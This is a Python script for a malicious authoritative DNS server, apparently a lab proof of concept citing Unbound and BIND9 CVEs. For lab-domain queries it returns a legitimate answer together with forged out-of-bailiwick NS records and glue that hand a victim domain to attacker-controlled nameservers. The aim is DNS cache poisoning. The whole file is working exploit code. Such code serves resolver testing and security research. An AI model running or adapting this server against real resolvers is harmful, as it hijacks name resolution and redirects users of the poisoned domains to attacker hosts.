#!/usr/bin/env python3
"""
Malicious authoritative server — attacker.lab zone.

Runs as the "legitimate" authority for attacker.lab.
On A queries for *.attacker.lab it returns:
  - Answer:     legitimate A record
  - Authority:  out-of-bailiwick malicious NS (victim.lab → ns1.evil.attacker.lab)
  - Additional: malicious glue A records

Standard checks (TXID, source, Question) all pass; the resolver's bailiwick check is the main defense.

See: CVE-2025-11411 (Unbound), CVE-2021-25220 (BIND9)
"""

import argparse
import socket
import sys
import time

import dns.flags
import dns.message
import dns.name
import dns.rcode
import dns.rdata
import dns.rdataclass
import dns.rdatatype


VICTIM_DOMAIN = "victim.lab."
EVIL_NS1 = "ns1.evil.attacker.lab."
EVIL_NS2 = "ns2.evil.attacker.lab."
EVIL_GLUE_IP = "172.21.0.99"

ANSWER_MAP = {
    "test.attacker.lab.": "6.6.6.7",
    "www.attacker.lab.":  "6.6.6.6",
    "trigger.attacker.lab.": "6.6.6.8",
}
DEFAULT_ANSWER_IP = "6.6.6.9"


def build_malicious_response(query_wire: bytes) -> bytes:
    """Build a response with out-of-bailiwick Authority NS records."""
    query = dns.message.from_wire(query_wire)
    qname = query.question[0].name
    qtype = query.question[0].rdtype
    qname_str = str(qname).lower()

    if not qname_str.endswith("attacker.lab."):
        resp = dns.message.make_response(query)
        resp.set_rcode(dns.rcode.REFUSED)
        return resp.to_wire()

    resp = dns.message.make_response(query)
    resp.flags |= dns.flags.AA | dns.flags.QR

    # --- Answer: legitimate A ---
    if qtype == dns.rdatatype.A:
        answer_ip = ANSWER_MAP.get(qname_str, DEFAULT_ANSWER_IP)
        rrset = resp.find_rrset(
            resp.answer, qname, dns.rdataclass.IN, dns.rdatatype.A, create=True
        )
        rrset.update_ttl(86400)
        rrset.add(dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.A, answer_ip))

    # --- Authority: malicious out-of-bailiwick NS ---
    # victim.lab is not under attacker.lab — core of the attack
    victim_name = dns.name.from_text(VICTIM_DOMAIN)
    ns_rrset = resp.find_rrset(
        resp.authority, victim_name, dns.rdataclass.IN, dns.rdatatype.NS, create=True
    )
    ns_rrset.update_ttl(86400)
    ns_rrset.add(dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.NS, EVIL_NS1))
    ns_rrset.add(dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.NS, EVIL_NS2))

    # --- Additional: malicious glue A ---
    for ns_name_str in (EVIL_NS1, EVIL_NS2):
        ns_name = dns.name.from_text(ns_name_str)
        glue = resp.find_rrset(
            resp.additional, ns_name, dns.rdataclass.IN, dns.rdatatype.A, create=True
        )
        glue.update_ttl(86400)
        glue.add(dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.A, EVIL_GLUE_IP))

    return resp.to_wire()


def main():
    parser = argparse.ArgumentParser(description="Malicious attacker.lab authoritative server")
    parser.add_argument("--port", type=int, default=9953, help="Listen port (default 9953)")
    parser.add_argument("--bind", default="0.0.0.0", help="Bind address (default 0.0.0.0)")
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((args.bind, args.port))

    print(f"[malicious auth] listening on {args.bind}:{args.port}")
    print(f"[malicious auth] for *.attacker.lab queries returns:")
    print(f"  Answer:     legitimate A")
    print(f"  Authority:  {VICTIM_DOMAIN} NS {EVIL_NS1}")
    print(f"              {VICTIM_DOMAIN} NS {EVIL_NS2}")
    print(f"  Additional: {EVIL_NS1} A {EVIL_GLUE_IP}")
    print(f"              {EVIL_NS2} A {EVIL_GLUE_IP}")
    print(f"[malicious auth] waiting for queries...\n")

    try:
        while True:
            data, addr = sock.recvfrom(4096)
            try:
                query = dns.message.from_wire(data)
                qname = query.question[0].name
                qtype_str = dns.rdatatype.to_text(query.question[0].rdtype)
                ts = time.strftime("%H:%M:%S")

                resp_wire = build_malicious_response(data)
                sock.sendto(resp_wire, addr)

                resp = dns.message.from_wire(resp_wire)
                rcode_str = dns.rcode.to_text(resp.rcode())

                print(f"[{ts}] query from {addr[0]}:{addr[1]} → {qname} {qtype_str}")
                print(f"  TXID={query.id}, rcode={rcode_str}")
                for tag, section in [("ANS", resp.answer), ("AUTH", resp.authority), ("ADD", resp.additional)]:
                    for rrset in section:
                        print(f"  {tag}: {rrset.to_text()}")
                print()
            except Exception as e:
                print(f"[ERROR] {e}")
    except KeyboardInterrupt:
        print("\n[malicious auth] stopped")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
